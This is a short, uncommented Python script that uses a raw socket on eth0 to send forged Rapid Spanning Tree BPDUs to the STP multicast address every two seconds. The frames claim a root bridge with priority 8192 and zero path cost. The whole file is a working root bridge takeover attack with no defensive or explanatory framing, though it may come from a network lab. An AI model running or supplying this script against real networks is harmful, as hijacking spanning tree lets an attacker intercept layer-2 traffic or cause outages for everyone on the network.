from socket import *
from struct import pack
from time import sleep

interface = "eth0"
dstmac = b"\x01\x80\xc2\x00\x00\x00"
srcmac = b"\x00\x50\x03\x00\x01\x00"
llc_header = b"\x42\x42\x03"

protocol_type = b"\x00\x00\x02\x02"
flags = b"\x7e"
# Priority is equal to 8192
rootID = b"\x20\x00\x00\x50\x03\x00\x01\x00"
path_cost = b"\x00" * 4
bridgeID = rootID
portID = b"\x80\x01"
msgAge = b"\x00\x00"
maxAge = b"\x14\x00"
hello = b"\x02\x00"
forwDelay = b"\x0f\x00"
versLen = b"\x00"

payload = (
    protocol_type
    + flags
    + rootID
    + path_cost
    + bridgeID
    + portID
    + msgAge
    + maxAge
    + hello
    + forwDelay
    + versLen
)

# > means big-endian, H is unsigned short
header = (
    dstmac + srcmac + pack(">H", len(llc_header) + len(payload)) + llc_header
)

s = socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))
while True:
    s.send(header + payload)
    sleep(2)
